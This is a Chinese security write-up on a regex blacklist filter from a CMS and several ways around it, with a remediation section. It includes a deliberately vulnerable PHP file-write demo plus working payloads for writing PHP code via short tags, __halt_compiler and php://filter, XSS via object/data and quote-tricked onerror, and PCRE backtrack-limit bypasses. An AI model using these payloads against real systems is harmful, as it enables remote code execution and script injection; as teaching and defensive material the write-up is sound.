一次对PHP正则绕过的思考历程
---------------

0x0 前言
------

​ 在某个CMS看到的一个基于正则的过滤函数，当时第一眼就觉得这种过滤其实没很大用的，后面深入地思考了一下，发现多种绕过思路，感觉还是蛮有意思的，分享出来跟大家学习，本文作用的话也是有一点吧，毕竟实战存在，也有CTF考点，值得看看。

0x1 函数解读
--------

过滤函数的代码如下:

```php
function checkstr($str)
{
   if (preg_match("/<(\/?)(script|i?frame|style|html|\?php|body|title|link|meta)([^>]*?)>/is", $str, $match)) {
       //front::flash(print_r($match,true));
       return false;
  }
   if (preg_match("/(<[^>]*)on[a-zA-Z]+\s*=([^>]*>)/is", $str, $match)) {
       return false;
  }
   return true;
}
```

很明显是做了两个if判断,根据逻辑，可以知道是黑名单判断，出现正则匹配成功，那就返回`false`，一般而言，黑名单是最容易出现花里胡哨的绕过姿势的。

> `preg_match`的用法:<https://www.php.net/manual/zh/function.preg-match.php>
> 
> ```php
>  preg_match(
>     string $pattern,
>     string $subject,
>     array &$matches = null,
>     int $flags = 0,
>     int $offset = 0
> ): int|false
> ```
> 
> 第一个是正则表达式，第二个是传入的检验字符串，第三个是匹配的数组结果，其他默认值，不需要了解。

### 0x1.1 第一层判断

首先看第一层判断:

```php
if (preg_match("/<(\/?)(script|i?frame|style|html|\?php|body|title|link|meta)([^>]*?)>/is", $str, $match)) {
       //front::flash(print_r($match,true));
       return false;
  }
```

需要分析下正则,丢进https://regex101.com/:

![image-20211124143903602](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-61ce76433fc4f629658f4c49451cd37777838147.png)

先看大方向，**Global pattern flags**为`is`

![image-20211124144137036](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-d5690ec58ffcd058f141cc9e8523472a83a501cf.png)

`i`则代表insensitive，不敏感，即忽略大小写，即大写和小写是一样的，都能匹配到

`s`的话在PHP的[修饰符定义](https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php)更为准确，扩充`.`的匹配能力。

![image-20211124145037743](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-643ab2af8345c195ead5ad54f01d15538b311730.png)

接着看正则:

```php
<(\/?)(script|i?frame|style|html|\?php|body|title|link|meta)([^>]*?)>
```

每个括号代表一个分组。

第一个分组代表`(\/?)`,元字符`?`代表0或者1个，即`/`可有可无。

第二个分组代表`(script|i?frame|style|html|\?php|body|title|link|meta)`，注意下`i?frame`代表匹配`frame`或者`iframe`,`\?php`,`\`起转义作用，表示字面匹配`?php`字符串。

第三个分组`([^>]*?)`,非贪婪模式，尽可能少匹配非`>`的所有字符，一直到结尾的`>`位置。

全都组合起来主要是拦截如下类似格式的恶意字符串:

```php
<script>
</script>
<script1>
</script1>
<?phpxxxxxxxx>
....
```

根据正则的意图，第一层的判断本意就是**过滤XSS标签，然后防止写入PHP标签**。

### 0x1.2 第二层判断

再看第二层判断:

```php
if (preg_match("/(<[^>]*)on[a-zA-Z]+\s*=([^>]*>)/is", $str, $match)) {
       return false;
  }
```

修饰符和前面一样为`is`，效果相同，扩充`.`匹配和忽略大小写。

然后这个正则有两个分组。

第一个分组:`(<[^>]*)`代表尽可能多地匹配`<`后解非`>`的任意字符构成的字符串，直至遇到`on[a-zA-Z]+\s*=`,即遇到`on`+任意大小写字母+任意多个`空白字符`+`=`构成的字符串就停止。

> `\s`匹配的空白字符包括`[\r\n\t\f\v ]`，这个正则其实多余的，浏览器遇到空白字符串加上`=`是不会解析的。

第二个分组:`([^>]*>)`,表示尽可能多地匹配非`>`的字符直至遇到`>`字符构成的字符串。

全部组合起来主要是拦截如下类似格式的恶意字符串:

```php
<xxxxonxxxxx=123>
<tag/xxx/xxx/onxxxx="xxx">
<img/src=x/onerror="xxx">
<onx=>
....
```

根据该正则的意图，很明显就是想拦截，过滤掉html标签纸中出现on事件，来避免XSS。

0x2 正则绕过
--------

下面我针对函数拦截的意图来逐一绕过。

### 0x2.1 绕过PHP标签

假设存在这样一个文件写入的场景`Vuln.php`,需要GetShell:

```php
<?php
function checkstr($str)
{
   if (preg_match("/<(\/?)(script|i?frame|style|html|\?php|body|title|link|meta)([^>]*?)>/is", $str, $match)) {
       //front::flash(print_r($match,true));
       return false;
  }
   if (preg_match("/(<[^>]*)on[a-zA-Z]+\s*=([^>]*>)/is", $str, $match)) {
       return false;
  }
   return true;
}
$file = $_GET['file'];
$content = $_GET['c'];
if(checkstr($content)){
    // 拼接垃圾内容到文件内容中
    $content .= "\nmake_php_error_xxxxxxxx";
    file_put_contents($file, $content);
    var_dump(file_get_contents($file));
}else{
    echo "No, Hacker!";
}
```

首先直接尝试写入恶意代码，肯定是被拦截的

```php
http://localhost:8887/xss.php?file=shell.php&c=%3C?php%20phpinfo();?%3E
```

![image-20211124165132762](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-cc6bf5558125a9232f4a09188ad109749908e5f4.png)

**Bypass 1:**

这里采取直接怼`?php`硬匹配的规则,PHP支持多种标签表示代码的开始和结束

```php
1.Normal <?php ?>
2.Short open tag <?= ?>
3.Asp Tags  <% %>, <%= ?>
4.Scripting tag: <script language="php">
5.Shorthand tag:  <? ?>
```

第1种直接被正则ban了，第3种php7移除，第4种被ban且php7移除，第5种需要开启`short_open_tag`短标签配置，第五种用法用的还挺多。

所以这里我们可以这样来绕过`?php`的正则:

```php
http://localhost:8887/xss.php?file=shell.php&c=%3C?=phpinfo();?%3E
```

![image-20211124171257537](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-103956a209e4c1b770d66c230bbaf072366a6b3c.png)

如果支持短标签，也可以这样绕过:

```php
http://localhost:8887/xss.php?file=shell.php&c=%3C?%20phpinfo();?%3E
```

这里因为结尾使用了`?>`来闭合，所以垃圾字符并不会影响代码的正常执行，Bypass Successfully!

**Bypass 2:**

那么除了Bypass 1这种很容易想到的方式，还有没有其他方式呢?

继续观察第一层判断的正则写法

![image-20211124171640891](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-0f9b8b1e20a730a404658f1b23940964ab9975d7.png)

要实现匹配的话比如要同时存在`<`、`?php`、`>`这三个字符串，但是我们知道php是可以这样执行代码的,可以不需要最终的`?>`作为结束标志，而是执行到文件结束的标志。

```php
<?php phpinfo();
```

那么我们是不是可以尝试这样绕过呢，这样就会因为末尾缺少`>`,造成正则失配。

```php
http://localhost:8887/xss.php?file=shell.php&c=%3C?php%20phpinfo();//
```

![image-20211124172301165](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-e3df3df0232e2706d7a2a76e965da708a98ceb0d.png)

绕过确实可以绕过，但是因为末尾拼接了换行和非法的php语法字符串，导致语法错误。如果没有换行的话，可以采用注释来绕过，但是这里不行，换行会导致单行注释失败，然而针对这种情况，可以使用CTF以前常见的一种思路，来进行闭合PHP语句向下执行。

```php
http://localhost:8887/xss.php?file=shell.php&c=%3C?php%20phpinfo();__halt_compiler();
```

`__halt_compiler()`:[php文档介绍](https://www.php.net/manual/zh/function.halt-compiler.php)

![image-20211124183931113](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-c276d05c0190d8d82395c02fe69e4e808b8b6c2e.png)

绕过一点压力也没有。

![image-20211124184123910](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-8109dc6cf17f1a441c4a824cf47221a4047bb041.png)

**Bypass 3:**

Bypass 3并不是本文的想要说的，且思路非常常规，CTF已经玩到烂的伪协议绕过，简单提提:

```php
http://localhost:8887/xss.php?file=php://filter/write=convert.base64-decode/resource=shell.php&c=PD9waHAgcGhwaW5mbygpOz8%2b
```

![image-20211124192220531](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-2e3a55f03a429426c5fa894b330580f95d44ef52.png)

### 0x2.2 绕过XSS过滤

假设存在如下一个场景，需要造成XSS:

```php
<?php
function checkstr($str)
{
   if (preg_match("/<(\/?)(script|i?frame|style|html|\?php|body|title|link|meta)([^>]*?)>/is", $str, $match)) {
       //front::flash(print_r($match,true));
       return false;
  }
   if (preg_match("/(<[^>]*)on[a-zA-Z]+\s*=([^>]*>)/is", $str, $match)) {
       return false;
  }
   return true;
}

$xss = $_GET['xss'];
if(checkstr($xss)){
    echo $xss;
}else{
    echo 'No, Hacker!';
}
```

第一层过滤就已经过滤`<script>`、`<iframe>`等标签的各种变形，而这样`<script`不闭合的话浏览器是没办法解析的。

而像`<a/href="html实体">`这种非自动触发的方法，太鸡肋了，绕起来没很大意义,下面依然给出几种不同的思路绕过。

**Bypass 1:**

```php
http://localhost:8887/xss.php?xss=%3Cobject/data=javascript:alert(1)%3E
```

直接通过`object/data`，来实现无onevent事件执行xss。

**Bypass 2:**

这个点就是我想讲的，这里需要结合正则的缺陷和浏览器解析规则来实现绕过。

```php
<img/src=x/onerror="alert(1)">
```

这样必然会被正则拦截的，那么怎么样才能绕过来实现执行这个代码呢？我们再回头审视下正则

![image-20211124194058454](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-3c1a59d31dff90a016963b85d32a2f124e91c060.png)

我们可以看到第一个分组，匹配的是非`>`的其他字符，因为写正则的人觉得遇到`>`就代表标签闭合了，所以没必要了，但是如果我们传入这样的语句呢?

```php
http://localhost:8887/xss.php?xss=%3Cimg/src=%3E/onerror=alert(1);%3E
```

![image-20211124194347988](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-99e06df438dbab53618a4389e4e72d491d81a1c8.png)

显然这样的话是可以绕过正则匹配的，因为`<img/src=`之后继续匹配到`>`话就会造成`([^>]*)`正则失配，所以就绕过了,但是这样浏览器解析闭合截断后面内容也符合正则作者的预期，没造成XSS，但是如果传入这样的payload呢?

```php
http://localhost:8887/xss.php?xss=%3Cimg/src=%22%3E%22/onerror=alert(1);%3E
```

![image-20211124194908149](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-eceb6c450427c792c291a9b74a0bf2febb4818b9.png)

很显然，双引号的优先级比`>`闭合要高，这样就实现一种经典的思维差异与不同环境差异造成的Bypass!

### 0x2.3 正则回溯绕过

判断有没有正则回溯绕过的可能性,有两个步骤:

1)首先看是如何判断`preg_match`函数返回值的。

正常来说，`preg_match`返回值只有0和1，但是如果超过回溯阈值，则会返回`false`。

如果是全等判断的话，那么就算回溯超过限制导致函数返回`false`，因为!==0故不会进入`eval`语句。

```php
if(preg_match("/a=1;/is", $strS, $match) === 0){eval($strS)};
```

但是如果是这样的判断的话，因为弱类型和类型转换的缘故，便会导致出现Bypass的情况。

```php
if(preg_match("/a=1;/is", $strS, $match) == 0){eval($strS)};
if(!preg_match("/a=1;/is", $strS, $match)){eval($strS)};
...
```

回头审视滤函数的正则，它恰恰犯了这个错误。

![image-20211124204332614](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-13c470a1dff64071caf52632da2e8cfe24cec0b6.png)

`preg_match`的返回值并没有做严格全等判断，所以如果我们能令其返回`false`，就能起到正则失配同样的效果。

2\) 接着我们需要观察正则的写法,因为PHP的函数调用的是`PCRE`库，使用的是NFA的正则引擎，如果正则存在回溯的过程，那么就可以尝试构造字符串通过超出回溯次数让函数返回`False`，实现绕过。

PHP的最大回溯次数默认为1000000:

```php
var_dump(ini_get("pcre.backtrack_limit"));
```

![image-20211124223205590](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-86867820b574c6ebd3b8fcc891c32d52a9731626.png)

观察第一个正则表达式:

![image-20211124223515536](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-8f42aad8ffb2cafe3bb94957e7e980cc38e8dfba.png)

可以看到在第三个分组存在多字符匹配过程，会一直查找到`>`结束，如果这里正则为`([^>]*)`没有`?`贪婪模式是构成不了回溯过程,因为回溯过程需要匹配到结尾字符串的时候并不会停止，而是回溯以求匹配后面的字符，而这里如果匹配到`>`那么程序就停止了，根本不会回溯来查找`>`，但是这里好巧不巧，使用到了非贪婪模式，那么匹配过程就会为了寻求最小值，每次都会进行回溯来匹配。

举个例子:

```php
<?php//aaaaaaa?>
```

那么解析时`[^>]*`匹配到`/`,因为非贪婪模式，就会停止，转而`>`去匹配第二个`/`，失败后，会回溯使用`[^>]*`匹配到`/`,然后一直下去，只要a的个数够多，就能造成`PREG_BACKTRACK_LIMIT_ERROR`错误。

构造这样的一个POST内容来绕过,其中aaa的个数为100w个:

```php
xss=<?php phpinfo();//aaaaaaaaaaaaaaaaaaaa..........?>
```

![image-20211125000340086](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-1ff8afadb5b5b5c7e33fd9b4b7bd4a1835782602.png)

同理我们观察第二个正则表达式:

![image-20211125000426141](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-c70aa661187247eda3aa555df7b23c258defa6d2.png)

第一个分组的位置因为在开头采用了贪婪匹配，会一开始匹配全部的字符串，这显然是不对的，因为后面还有`on[a-zA-z]+\s*=`为了匹配上，那么便会回溯,找到位置，那么我们就可以在回溯的路上填充足够的字符，增加回溯次数。

![image-20211125000821139](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-1c2a4355dffc31df93fec9742c85d7ea7a249cc5.png)

所以我们可以这样实现绕过,aaaa...指100w个a字符:

```php
xss=<img/src="x"/onerror="alert(1)";//aaaa...>
```

![image-20211125001337809](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-ccf4a8ed168bcd6d5edb40b292cdbbb792b32dbe.png)

生成CSRF，尝试看下能不能造成POST XSS，Burp右键-&gt;Engagement tools-&gt;generate CSRF POC-&gt;Test In Browser。

![image-20211125001554892](https://shs3.b.qianxin.com/attack_forum/2021/11/attach-6df76cf01ae21d58208cf65d95d860719317b394.png)

0x3 修复思路
--------

​ 有一说一，这个正则基本没很大作用，硬是要修复的话，可以针对Bypass的点来增强黑名单的规则，但是这样并不能确保100%安全了，因为可能还有其他差异没有发现。个人觉得最好的修复方式，上云端WAF，哈哈哈哈哈哈....

​ 不扯了，给出一个比较稳妥的，也是经常可以在一些CMS看到的处理思路，那就是直接对内容进行HTML实体化一次，然后再根据功能需要，进行解码，然后提取所需的内容，便可实现一种安全与便捷的可控平衡。这种方法有效的原因是直接杜绝了`<`这个符号，所以上面的Bypass直接歇菜了，基本不可能绕过的，当然我这里是忽略伪协议那种绕过技巧，针对伪协议的防护，最好是对文件名进行重命名为一些MD5+时间戳之类的值。

0x4 总结
------

​ 本文是一个很经典且全面的PHP环境下的正则Bypass的案例，里面组合了很多CTF和实战的技巧，也许读者某一天会在做CTF的时候会遇到基于这个的变形题目，相信你一定能比我更强，找到方法来解决!

​

0x5 参考链接
--------

[PHP Basic SynTax](https://learn2torials.com/a/basic-syntax)

[PHP利用PCRE回溯次数限制绕过某些安全限制](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)